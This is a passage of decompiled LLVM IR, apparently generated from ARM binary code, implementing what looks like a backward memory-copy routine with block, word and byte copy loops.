  %v0_16abc = phi i32 [ %v1_16ac4, %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge ], [ %v0_16abc37, %dec_label_pc_16aac ]
  %v0_16ab8 = phi i32 [ %v0_16ab8.pre, %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge ], [ %v0_16ab836, %dec_label_pc_16aac ]
  %v1_16ab8 = add i32 %v0_16ab8, -4
  %v2_16ab8 = inttoptr i32 %v1_16ab8 to i32*
  %v3_16ab8 = load i32, i32* %v2_16ab8, align 4
  %v4_16ab8 = add i32 %v0_16ab8, -8
  %v5_16ab8 = inttoptr i32 %v4_16ab8 to i32*
  %v6_16ab8 = load i32, i32* %v5_16ab8, align 4
  store i32 %v6_16ab8, i32* %r4.global-to-local, align 4
  %v7_16ab8 = add i32 %v0_16ab8, -12
  %v8_16ab8 = inttoptr i32 %v7_16ab8 to i32*
  %v9_16ab8 = load i32, i32* %v8_16ab8, align 4
  store i32 %v9_16ab8, i32* %ip.global-to-local, align 4
  %v10_16ab8 = add i32 %v0_16ab8, -16
  %v11_16ab8 = inttoptr i32 %v10_16ab8 to i32*
  %v12_16ab8 = load i32, i32* %v11_16ab8, align 4
  store i32 %v12_16ab8, i32* %lr.global-to-local, align 4
  store i32 %v10_16ab8, i32* %r1.global-to-local, align 4
  %v1_16abc = add i32 %v0_16abc, -16
  %v2_16abc = inttoptr i32 %v1_16abc to i32*
  store i32 %v3_16ab8, i32* %v2_16abc, align 4
  %v4_16abc = add i32 %v0_16abc, -12
  %v5_16abc = inttoptr i32 %v4_16abc to i32*
  %v6_16abc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16abc, i32* %v5_16abc, align 4
  %v7_16abc = add i32 %v0_16abc, -8
  %v8_16abc = inttoptr i32 %v7_16abc to i32*
  %v9_16abc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16abc, i32* %v8_16abc, align 4
  %v10_16abc = add i32 %v0_16abc, -4
  %v11_16abc = inttoptr i32 %v10_16abc to i32*
  %v12_16abc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16abc, i32* %v11_16abc, align 4
  store i32 %v1_16abc, i32* %r0.global-to-local, align 4
  %v0_16ac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ac0 = add i32 %v0_16ac0, -4
  %v2_16ac0 = inttoptr i32 %v1_16ac0 to i32*
  %v3_16ac0 = load i32, i32* %v2_16ac0, align 4
  store i32 %v3_16ac0, i32* @r3, align 4
  %v4_16ac0 = add i32 %v0_16ac0, -8
  %v5_16ac0 = inttoptr i32 %v4_16ac0 to i32*
  %v6_16ac0 = load i32, i32* %v5_16ac0, align 4
  store i32 %v6_16ac0, i32* %r4.global-to-local, align 4
  %v7_16ac0 = add i32 %v0_16ac0, -12
  %v8_16ac0 = inttoptr i32 %v7_16ac0 to i32*
  %v9_16ac0 = load i32, i32* %v8_16ac0, align 4
  store i32 %v9_16ac0, i32* @ip, align 4
  %v10_16ac0 = add i32 %v0_16ac0, -16
  %v11_16ac0 = inttoptr i32 %v10_16ac0 to i32*
  %v12_16ac0 = load i32, i32* %v11_16ac0, align 4
  store i32 %v12_16ac0, i32* %lr.global-to-local, align 4
  store i32 %v10_16ac0, i32* %r1.global-to-local, align 4
  %v1_16ac4 = add i32 %v0_16abc, -32
  %v2_16ac4 = inttoptr i32 %v1_16ac4 to i32*
  store i32 %v3_16ac0, i32* %v2_16ac4, align 4
  %v4_16ac4 = add i32 %v0_16abc, -28
  %v5_16ac4 = inttoptr i32 %v4_16ac4 to i32*
  %v6_16ac4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16ac4, i32* %v5_16ac4, align 4
  %v7_16ac4 = add i32 %v0_16abc, -24
  %v8_16ac4 = inttoptr i32 %v7_16ac4 to i32*
  %v9_16ac4 = load i32, i32* @ip, align 4
  store i32 %v9_16ac4, i32* %v8_16ac4, align 4
  %v10_16ac4 = add i32 %v0_16abc, -20
  %v11_16ac4 = inttoptr i32 %v10_16ac4 to i32*
  %v12_16ac4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ac4, i32* %v11_16ac4, align 4
  store i32 %v1_16ac4, i32* %r0.global-to-local, align 4
  %v0_16ac8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ac8 = add i32 %v0_16ac8, -32
  store i32 %v2_16ac8, i32* %r2.global-to-local, align 4
  %v6_16acc = icmp slt i32 %v0_16ac8, 32
  br i1 %v6_16acc, label %dec_label_pc_16ad0.loopexit, label %dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge

dec_label_pc_16ab8.dec_label_pc_16ab8_crit_edge:  ; preds = %dec_label_pc_16ab8
  %v0_16ab8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ab8

dec_label_pc_16ad0.loopexit:                      ; preds = %dec_label_pc_16ab8
  %v4_16ac8 = sub i32 31, %v0_16ac8
  %v5_16ac8 = and i32 %v4_16ac8, %v0_16ac8
  %v6_16ac8 = icmp slt i32 %v5_16ac8, 0
  %v7_16ac8 = icmp slt i32 %v2_16ac8, 0
  store i1 %v6_16ac8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16ac8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16ad0.loopexit, %dec_label_pc_16aac
  %v6_16ad8 = phi i32 [ %v1_16ac4, %dec_label_pc_16ad0.loopexit ], [ %v0_16abc37, %dec_label_pc_16aac ]
  %v0_16ae0.pr = phi i32 [ %v2_16ac8, %dec_label_pc_16ad0.loopexit ], [ %v2_16ab0, %dec_label_pc_16aac ]
  %v4_16ad0 = add i32 %v0_16ae0.pr, 16
  %v6_16ad0 = sub i32 0, %v0_16ae0.pr
  %v7_16ad0 = and i32 %v4_16ad0, %v6_16ad0
  %v8_16ad0 = icmp slt i32 %v7_16ad0, 0
  store i1 %v8_16ad0, i1* %cpsr_v.global-to-local, align 1
  %v9_16ad0 = icmp slt i32 %v4_16ad0, 0
  store i1 %v9_16ad0, i1* %cpsr_n.global-to-local, align 1
  %v10_16ad0 = icmp eq i32 %v4_16ad0, 0
  store i1 %v10_16ad0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ad4 = icmp slt i32 %v0_16ae0.pr, -16
  br i1 %v5_16ad4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_16ad0
  %v6_16ad4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16ad4 = add i32 %v6_16ad4, -4
  %v8_16ad4 = inttoptr i32 %v7_16ad4 to i32*
  %v9_16ad4 = load i32, i32* %v8_16ad4, align 4
  store i32 %v9_16ad4, i32* @r3, align 4
  %v10_16ad4 = add i32 %v6_16ad4, -8
  %v11_16ad4 = inttoptr i32 %v10_16ad4 to i32*
  %v12_16ad4 = load i32, i32* %v11_16ad4, align 4
  store i32 %v12_16ad4, i32* %r4.global-to-local, align 4
  %v13_16ad4 = add i32 %v6_16ad4, -12
  %v14_16ad4 = inttoptr i32 %v13_16ad4 to i32*
  %v15_16ad4 = load i32, i32* %v14_16ad4, align 4
  store i32 %v15_16ad4, i32* @ip, align 4
  %v16_16ad4 = add i32 %v6_16ad4, -16
  %v17_16ad4 = inttoptr i32 %v16_16ad4 to i32*
  %v18_16ad4 = load i32, i32* %v17_16ad4, align 4
  store i32 %v18_16ad4, i32* %lr.global-to-local, align 4
  store i32 %v16_16ad4, i32* %r1.global-to-local, align 4
  %v7_16ad8 = add i32 %v6_16ad8, -16
  %v8_16ad8 = inttoptr i32 %v7_16ad8 to i32*
  store i32 %v9_16ad4, i32* %v8_16ad8, align 4
  %v10_16ad8 = add i32 %v6_16ad8, -12
  %v11_16ad8 = inttoptr i32 %v10_16ad8 to i32*
  %v12_16ad8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16ad8, i32* %v11_16ad8, align 4
  %v13_16ad8 = add i32 %v6_16ad8, -8
  %v14_16ad8 = inttoptr i32 %v13_16ad8 to i32*
  %v15_16ad8 = load i32, i32* @ip, align 4
  store i32 %v15_16ad8, i32* %v14_16ad8, align 4
  %v16_16ad8 = add i32 %v6_16ad8, -4
  %v17_16ad8 = inttoptr i32 %v16_16ad8 to i32*
  %v18_16ad8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16ad8, i32* %v17_16ad8, align 4
  store i32 %v7_16ad8, i32* %r0.global-to-local, align 4
  %v6_16adc = load i32, i32* %r2.global-to-local, align 4
  %v7_16adc = add i32 %v6_16adc, -16
  store i32 %v7_16adc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16ad0, %bb147
  %v6_16ae8 = phi i32 [ %v7_16ad8, %bb147 ], [ %v6_16ad8, %dec_label_pc_16ad0 ]
  %v0_16ae0 = phi i32 [ %v7_16adc, %bb147 ], [ %v0_16ae0.pr, %dec_label_pc_16ad0 ]
  %v4_16ae0 = add i32 %v0_16ae0, 20
  store i32 %v4_16ae0, i32* %r2.global-to-local, align 4
  %v6_16ae0 = sub i32 0, %v0_16ae0
  %v7_16ae0 = and i32 %v4_16ae0, %v6_16ae0
  %v8_16ae0 = icmp slt i32 %v7_16ae0, 0
  store i1 %v8_16ae0, i1* %cpsr_v.global-to-local, align 1
  %v9_16ae0 = icmp slt i32 %v4_16ae0, 0
  store i1 %v9_16ae0, i1* %cpsr_n.global-to-local, align 1
  %v10_16ae0 = icmp eq i32 %v4_16ae0, 0
  store i1 %v10_16ae0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ae4 = icmp slt i32 %v0_16ae0, -20
  br i1 %v5_16ae4, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_16ae4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16ae4 = add i32 %v6_16ae4, -4
  %v8_16ae4 = inttoptr i32 %v7_16ae4 to i32*
  %v9_16ae4 = load i32, i32* %v8_16ae4, align 4
  store i32 %v9_16ae4, i32* @r3, align 4
  %v10_16ae4 = add i32 %v6_16ae4, -8
  %v11_16ae4 = inttoptr i32 %v10_16ae4 to i32*
  %v12_16ae4 = load i32, i32* %v11_16ae4, align 4
  store i32 %v12_16ae4, i32* @ip, align 4
  %v13_16ae4 = add i32 %v6_16ae4, -12
  %v14_16ae4 = inttoptr i32 %v13_16ae4 to i32*
  %v15_16ae4 = load i32, i32* %v14_16ae4, align 4
  store i32 %v15_16ae4, i32* %lr.global-to-local, align 4
  store i32 %v13_16ae4, i32* %r1.global-to-local, align 4
  %v7_16ae8 = add i32 %v6_16ae8, -12
  %v8_16ae8 = inttoptr i32 %v7_16ae8 to i32*
  store i32 %v9_16ae4, i32* %v8_16ae8, align 4
  %v10_16ae8 = add i32 %v6_16ae8, -8
  %v11_16ae8 = inttoptr i32 %v10_16ae8 to i32*
  %v12_16ae8 = load i32, i32* @ip, align 4
  store i32 %v12_16ae8, i32* %v11_16ae8, align 4
  %v13_16ae8 = add i32 %v6_16ae8, -4
  %v14_16ae8 = inttoptr i32 %v13_16ae8 to i32*
  %v15_16ae8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16ae8, i32* %v14_16ae8, align 4
  store i32 %v7_16ae8, i32* %r0.global-to-local, align 4
  %v6_16aec = load i32, i32* %r2.global-to-local, align 4
  %v7_16aec = add i32 %v6_16aec, -12
  store i32 %v7_16aec, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_16b0c45 = phi i32 [ %v6_16ae8, %.thread2 ], [ %v7_16ae8, %bb148 ]
  %v0_16af443 = phi i32 [ %v4_16ae0, %.thread2 ], [ %v7_16aec, %bb148 ]
  %v2_16af0 = load i8*, i8** %stack_var_-8, align 4
  %v3_16af0 = ptrtoint i8* %v2_16af0 to i32
  store i32 %v3_16af0, i32* @r4, align 4
  store i32 %v8_16aac, i32* @lr, align 4
  br label %dec_label_pc_16af4

dec_label_pc_16af4:                               ; preds = %dec_label_pc_16aa4, %.thread4
  %v7_16b04 = phi i32 [ %v0_16abc37, %dec_label_pc_16aa4 ], [ %v6_16b0c45, %.thread4 ]
  %v0_16af4 = phi i32 [ %v2_16aa4, %dec_label_pc_16aa4 ], [ %v0_16af443, %.thread4 ]
  %v2_16af4 = add i32 %v0_16af4, 8
  store i32 %v2_16af4, i32* %r2.global-to-local, align 4
  %v4_16af4 = sub i32 0, %v0_16af4
  %v5_16af4 = and i32 %v2_16af4, %v4_16af4
  %v6_16af4 = icmp slt i32 %v5_16af4, 0
  store i1 %v6_16af4, i1* %cpsr_v.global-to-local, align 1
  %v7_16af4 = icmp slt i32 %v2_16af4, 0
  store i1 %v7_16af4, i1* %cpsr_n.global-to-local, align 1
  %v8_16af4 = icmp eq i32 %v2_16af4, 0
  store i1 %v8_16af4, i1* %cpsr_z.global-to-local, align 1
  %v5_16af8 = icmp slt i32 %v0_16af4, -8
  br i1 %v5_16af8, label %bb150, label %dec_label_pc_16afc

dec_label_pc_16afc:                               ; preds = %dec_label_pc_16af4
  %v6_16afc = add i32 %v0_16af4, 4
  store i32 %v6_16afc, i32* %r2.global-to-local, align 4
  %v8_16afc = sub i32 -5, %v0_16af4
  %v9_16afc = and i32 %v8_16afc, %v2_16af4
  %v10_16afc = icmp slt i32 %v9_16afc, 0
  store i1 %v10_16afc, i1* %cpsr_v.global-to-local, align 1
  %v11_16afc = icmp slt i32 %v6_16afc, 0
  store i1 %v11_16afc, i1* %cpsr_n.global-to-local, align 1
  %v12_16afc = icmp eq i32 %v2_16af4, 4
  store i1 %v12_16afc, i1* %cpsr_z.global-to-local, align 1
  %v5_16b00 = icmp slt i32 %v2_16af4, 4
  %v6_16b00 = load i32, i32* %r1.global-to-local, align 4
  %v7_16b00 = add i32 %v6_16b00, -4
  %v8_16b00 = inttoptr i32 %v7_16b00 to i32*
  %v9_16b00 = load i32, i32* %v8_16b00, align 4
  store i32 %v9_16b00, i32* @r3, align 4
  br i1 %v5_16b00, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_16afc
  store i32 %v7_16b00, i32* %r1.global-to-local, align 4
  %v8_16b04 = add i32 %v7_16b04, -4
  %v9_16b04 = inttoptr i32 %v8_16b04 to i32*
  store i32 %v9_16b00, i32* %v9_16b04, align 4
  %v10_16b04 = load i32, i32* %r0.global-to-local, align 4
  %v11_16b04 = add i32 %v10_16b04, -4
  store i32 %v11_16b04, i32* %r0.global-to-local, align 4
  %v0_16b14.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16afc
  %v10_16b08 = add i32 %v6_16b00, -8
  %v11_16b08 = inttoptr i32 %v10_16b08 to i32*
  %v12_16b08 = load i32, i32* %v11_16b08, align 4
  store i32 %v12_16b08, i32* @ip, align 4
  store i32 %v10_16b08, i32* %r1.global-to-local, align 4
  %v7_16b0c = add i32 %v7_16b04, -8
  %v8_16b0c = inttoptr i32 %v7_16b0c to i32*
  store i32 %v9_16b00, i32* %v8_16b0c, align 4
  %v10_16b0c = add i32 %v7_16b04, -4
  %v11_16b0c = inttoptr i32 %v10_16b0c to i32*
  %v12_16b0c = load i32, i32* @ip, align 4
  store i32 %v12_16b0c, i32* %v11_16b0c, align 4
  store i32 %v7_16b0c, i32* %r0.global-to-local, align 4
  %v6_16b10 = load i32, i32* %r2.global-to-local, align 4
  %v7_16b10 = add i32 %v6_16b10, -4
  store i32 %v7_16b10, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_16af4, %dec_label_pc_16a84, %dec_label_pc_16cb8, %dec_label_pc_16c4c, %dec_label_pc_16be0, %bb149
  %v2_16b18 = phi i32 [ %v11_16b04, %.thread8 ], [ %v0_16bb020, %.thread14 ], [ %v7_16b04, %dec_label_pc_16af4 ], [ %v2_16a88, %dec_label_pc_16a84 ], [ %v2_16b2453, %dec_label_pc_16cb8 ], [ %v2_16b2452, %dec_label_pc_16c4c ], [ %v2_16b2451, %dec_label_pc_16be0 ], [ %v7_16b0c, %bb149 ]
  %v0_16b14 = phi i32 [ %v0_16b14.pre, %.thread8 ], [ %v2_16b58, %.thread14 ], [ %v2_16af4, %dec_label_pc_16af4 ], [ %v2_16a8c, %dec_label_pc_16a84 ], [ %v0_16b1449, %dec_label_pc_16cb8 ], [ %v0_16b1448, %dec_label_pc_16c4c ], [ %v0_16b1447, %dec_label_pc_16be0 ], [ %v7_16b10, %bb149 ]
  %v1_16b14 = add i32 %v0_16b14, 4
  store i32 %v1_16b14, i32* %r2.global-to-local, align 4
  %v3_16b14 = sub i32 0, %v0_16b14
  %v4_16b14 = and i32 %v1_16b14, %v3_16b14
  %v5_16b14 = icmp slt i32 %v4_16b14, 0
  store i1 %v5_16b14, i1* %cpsr_v.global-to-local, align 1
  %v6_16b14 = icmp slt i32 %v1_16b14, 0
  store i1 %v6_16b14, i1* %cpsr_n.global-to-local, align 1
  %v7_16b14 = icmp eq i32 %v1_16b14, 0
  store i1 %v7_16b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b14, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16b1c = add i32 %v0_16b14, 2
  %v3_16b1c = sub i32 -3, %v0_16b14
  %v4_16b1c = and i32 %v3_16b1c, %v1_16b14
  %v5_16b1c = icmp slt i32 %v4_16b1c, 0
  store i1 %v5_16b1c, i1* %cpsr_v.global-to-local, align 1
  %v6_16b1c = icmp slt i32 %v1_16b1c, 0
  store i1 %v6_16b1c, i1* %cpsr_n.global-to-local, align 1
  %v7_16b1c = icmp eq i32 %v1_16b14, 2
  store i1 %v7_16b1c, i1* %cpsr_z.global-to-local, align 1
  %v0_16b20 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b20 = add i32 %v0_16b20, -1
  %v2_16b20 = inttoptr i32 %v1_16b20 to i8*
  %v3_16b20 = load i8, i8* %v2_16b20, align 1
  %v4_16b20 = zext i8 %v3_16b20 to i32
  store i32 %v4_16b20, i32* @r3, align 4
  store i32 %v1_16b20, i32* %r1.global-to-local, align 4
  %v3_16b24 = add i32 %v2_16b18, -1
  %v4_16b24 = inttoptr i32 %v3_16b24 to i8*
  store i8 %v3_16b20, i8* %v4_16b24, align 1
  %v5_16b24 = load i32, i32* %r0.global-to-local, align 4
  %v6_16b24 = add i32 %v5_16b24, -1
  store i32 %v6_16b24, i32* %r0.global-to-local, align 4
  %v0_16b28 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16b28 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16b28 = xor i1 %v0_16b28, %v1_16b28
  br i1 %v2_16b28, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16b28 = load i32, i32* %r1.global-to-local, align 4
  %v4_16b28 = add i32 %v3_16b28, -1
  %v5_16b28 = inttoptr i32 %v4_16b28 to i8*
  %v6_16b28 = load i8, i8* %v5_16b28, align 1
  %v7_16b28 = zext i8 %v6_16b28 to i32
  store i32 %v7_16b28, i32* @r3, align 4
  store i32 %v4_16b28, i32* %r1.global-to-local, align 4
  %v6_16b2c = add i32 %v5_16b24, -2
  %v7_16b2c = inttoptr i32 %v6_16b2c to i8*
  store i8 %v6_16b28, i8* %v7_16b2c, align 1
  %v8_16b2c = load i32, i32* %r0.global-to-local, align 4
  %v9_16b2c = add i32 %v8_16b2c, -1
  store i32 %v9_16b2c, i32* %r0.global-to-local, align 4
  %v1_16b30.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16b30.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_16b34 = phi i32 [ %v9_16b2c, %bb152 ], [ %v6_16b24, %bb151 ]
  %v2_16b34 = phi i1 [ %v2_16b30.pre, %bb152 ], [ %v1_16b28, %bb151 ]
  %v1_16b34 = phi i1 [ %v1_16b30.pre, %bb152 ], [ %v0_16b28, %bb151 ]
  %v0_16b30 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16b30 = xor i1 %v2_16b34, %v1_16b34
  %v4_16b30 = or i1 %v0_16b30, %v3_16b30
  br i1 %v4_16b30, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_16b30 = load i32, i32* %r1.global-to-local, align 4
  %v6_16b30 = add i32 %v5_16b30, -1
  %v7_16b30 = inttoptr i32 %v6_16b30 to i8*
  %v8_16b30 = load i8, i8* %v7_16b30, align 1
  %v9_16b30 = zext i8 %v8_16b30 to i32
  store i32 %v9_16b30, i32* @r3, align 4
  store i32 %v6_16b30, i32* %r1.global-to-local, align 4
  %v8_16b34 = add i32 %v7_16b34, -1
  %v9_16b34 = inttoptr i32 %v8_16b34 to i8*
  store i8 %v8_16b30, i8* %v9_16b34, align 1
  %v10_16b34 = load i32, i32* %r0.global-to-local, align 4
  %v11_16b34 = add i32 %v10_16b34, -1
  store i32 %v11_16b34, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16a94
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16b3c = icmp eq i32 %v1_16a94, 1
  store i1 %v8_16b3c, i1* %cpsr_n.global-to-local, align 1
  %v9_16b3c = icmp eq i32 %v1_16a94, 2
  store i1 %v9_16b3c, i1* %cpsr_z.global-to-local, align 1
  %v1_16b40 = add i32 %v2_16a84, -1
  %v2_16b40 = inttoptr i32 %v1_16b40 to i8*
  %v3_16b40 = load i8, i8* %v2_16b40, align 1
  %v4_16b40 = zext i8 %v3_16b40 to i32
  store i32 %v4_16b40, i32* @r3, align 4
  store i32 %v1_16b40, i32* %r1.global-to-local, align 4
  %v3_16b44 = add i32 %v2_16a88, -1
  %v4_16b44 = inttoptr i32 %v3_16b44 to i8*
  store i8 %v3_16b40, i8* %v4_16b44, align 1
  %v5_16b44 = load i32, i32* %r0.global-to-local, align 4
  %v6_16b44 = add i32 %v5_16b44, -1
  store i32 %v6_16b44, i32* %r0.global-to-local, align 4
  br i1 %v8_16b3c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_16b3c
  %v6_16b48 = load i32, i32* %r1.global-to-local, align 4
  %v7_16b48 = add i32 %v6_16b48, -1
  %v8_16b48 = inttoptr i32 %v7_16b48 to i8*
  %v9_16b48 = load i8, i8* %v8_16b48, align 1
  %v10_16b48 = zext i8 %v9_16b48 to i32
  store i32 %v10_16b48, i32* @r3, align 4
  store i32 %v7_16b48, i32* %r1.global-to-local, align 4
  %v9_16b4c = add i32 %v5_16b44, -2
  %v10_16b4c = inttoptr i32 %v9_16b4c to i8*
  store i8 %v9_16b48, i8* %v10_16b4c, align 1
  %v11_16b4c = load i32, i32* %r0.global-to-local, align 4
  %v12_16b4c = add i32 %v11_16b4c, -1
  store i32 %v12_16b4c, i32* %r0.global-to-local, align 4
  br i1 %v9_16b3c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16b50 = load i32, i32* %r1.global-to-local, align 4
  %v9_16b50 = add i32 %v8_16b50, -1
  %v10_16b50 = inttoptr i32 %v9_16b50 to i8*
  %v11_16b50 = load i8, i8* %v10_16b50, align 1
  %v12_16b50 = zext i8 %v11_16b50 to i32
  store i32 %v12_16b50, i32* @r3, align 4
  store i32 %v9_16b50, i32* %r1.global-to-local, align 4
  %v11_16b54 = add i32 %v11_16b4c, -2
  %v12_16b54 = inttoptr i32 %v11_16b54 to i8*
  store i8 %v11_16b50, i8* %v12_16b54, align 1
  %v13_16b54 = load i32, i32* %r0.global-to-local, align 4
  %v14_16b54 = add i32 %v13_16b54, -1
  store i32 %v14_16b54, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_16b3c, %bb155
  %v0_16bb020 = phi i32 [ %v12_16b4c, %bb154 ], [ %v6_16b44, %dec_label_pc_16b3c ], [ %v14_16b54, %bb155 ]
  %v0_16b58 = load i32, i32* %r2.global-to-local, align 4
  %v1_16b58 = load i32, i32* @ip, align 4
  %v2_16b58 = sub i32 %v0_16b58, %v1_16b58
  store i32 %v2_16b58, i32* %r2.global-to-local, align 4
  %v4_16b58 = xor i32 %v1_16b58, %v0_16b58
  %v5_16b58 = xor i32 %v2_16b58, %v0_16b58
  %v6_16b58 = and i32 %v5_16b58, %v4_16b58
  %v7_16b58 = icmp slt i32 %v6_16b58, 0
  store i1 %v7_16b58, i1* %cpsr_v.global-to-local, align 1
  %v8_16b58 = icmp slt i32 %v2_16b58, 0
  store i1 %v8_16b58, i1* %cpsr_n.global-to-local, align 1
  %v9_16b58 = icmp eq i32 %v0_16b58, %v1_16b58
  store i1 %v9_16b58, i1* %cpsr_z.global-to-local, align 1
  %v5_16b5c = icmp slt i32 %v0_16b58, %v1_16b58
  br i1 %v5_16b5c, label %bb150, label %dec_label_pc_16b60

dec_label_pc_16b60:                               ; preds = %.thread14
  %v0_16b60 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b60 = urem i32 %v0_16b60, 4
  store i32 %v1_16b60, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b60 = icmp eq i32 %v1_16b60, 0
  store i1 %v2_16b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b60, label %dec_label_pc_16aa4, label %dec_label_pc_16b68

dec_label_pc_16b68:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16b60
  %v0_16bb019 = phi i32 [ %v2_16a88, %dec_label_pc_16a9c ], [ %v0_16bb020, %dec_label_pc_16b60 ]
  %v0_16c5c = phi i32 [ %v2_16a8c, %dec_label_pc_16a9c ], [ %v2_16b58, %dec_label_pc_16b60 ]
  %v0_16b68 = phi i32 [ %v2_16a84, %dec_label_pc_16a9c ], [ %v0_16b60, %dec_label_pc_16b60 ]
  %v0_16b70 = phi i32 [ %v1_16a9c, %dec_label_pc_16a9c ], [ %v1_16b60, %dec_label_pc_16b60 ]
  %v1_16b68 = and i32 %v0_16b68, -4
  store i32 %v1_16b68, i32* %r1.global-to-local, align 4
  %v1_16b6c = inttoptr i32 %v1_16b68 to i32*
  %v2_16b6c = load i32, i32* %v1_16b6c, align 4
  store i32 %v2_16b6c, i32* @r3, align 4
  %v7_16b70 = icmp ult i32 %v0_16b70, 2
  %v2_16c54 = add i32 %v0_16c5c, -12
  %v4_16c54 = sub i32 11, %v0_16c5c
  %v5_16c54 = and i32 %v4_16c54, %v0_16c5c
  %v6_16c54 = icmp slt i32 %v5_16c54, 0
  store i1 %v6_16c54, i1* %cpsr_v.global-to-local, align 1
  %v7_16c54 = icmp slt i32 %v2_16c54, 0
  store i1 %v7_16c54, i1* %cpsr_n.global-to-local, align 1
  %v8_16c54 = icmp eq i32 %v0_16c5c, 12
  store i1 %v8_16c54, i1* %cpsr_z.global-to-local, align 1
  %v5_16c58 = icmp slt i32 %v0_16c5c, 12
  br i1 %v7_16b70, label %dec_label_pc_16c54, label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b68
  %v8_16b70 = icmp eq i32 %v0_16b70, 2
  br i1 %v8_16b70, label %dec_label_pc_16be8, label %dec_label_pc_16b7c

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b78
  br i1 %v5_16c58, label %dec_label_pc_16bc8, label %dec_label_pc_16b84

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b7c
  store i32 %v2_16c54, i32* %r2.global-to-local, align 4
  %v3_16b88 = load i32, i32* @r4, align 4
  store i32 %v3_16b88, i32* %stack_var_-12, align 4
  %v6_16b88 = load i32, i32* @r5, align 4
  %v8_16b88 = inttoptr i32 %v6_16b88 to i8*
  store i8* %v8_16b88, i8** %stack_var_-8, align 4
  %v11_16b88 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16b8c

dec_label_pc_16b8c:                               ; preds = %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge, %dec_label_pc_16b84
  %v0_16bb0 = phi i32 [ %v1_16bb0, %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge ], [ %v0_16bb019, %dec_label_pc_16b84 ]
  %v0_16b90 = phi i32 [ %v0_16b90.pre, %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge ], [ %v1_16b68, %dec_label_pc_16b84 ]
  %v0_16b8c = phi i32 [ %v0_16b8c.pre, %dec_label_pc_16b8c.dec_label_pc_16b8c_crit_edge ], [ %v2_16b6c, %dec_label_pc_16b84 ]
  %v3_16b8c = mul i32 %v0_16b8c, 256
  store i32 %v3_16b8c, i32* %lr.global-to-local, align 4
  %v1_16b90 = add i32 %v0_16b90, -4
  %v2_16b90 = inttoptr i32 %v1_16b90 to i32*
  %v3_16b90 = load i32, i32* %v2_16b90, align 4
  store i32 %v3_16b90, i32* @r3, align 4
  %v4_16b90 = add i32 %v0_16b90, -8
  %v5_16b90 = inttoptr i32 %v4_16b90 to i32*
  %v6_16b90 = load i32, i32* %v5_16b90, align 4
  store i32 %v6_16b90, i32* %r4.global-to-local, align 4
  %v7_16b90 = add i32 %v0_16b90, -12
  %v8_16b90 = inttoptr i32 %v7_16b90 to i32*
  %v9_16b90 = load i32, i32* %v8_16b90, align 4
  store i32 %v9_16b90, i32* %r5.global-to-local, align 4
  %v10_16b90 = add i32 %v0_16b90, -16
  %v11_16b90 = inttoptr i32 %v10_16b90 to i32*
  %v12_16b90 = load i32, i32* %v11_16b90, align 4
  store i32 %v10_16b90, i32* %r1.global-to-local, align 4
  %v4_16b94 = udiv i32 %v12_16b90, 16777216
  %v5_16b94 = or i32 %v4_16b94, %v3_16b8c
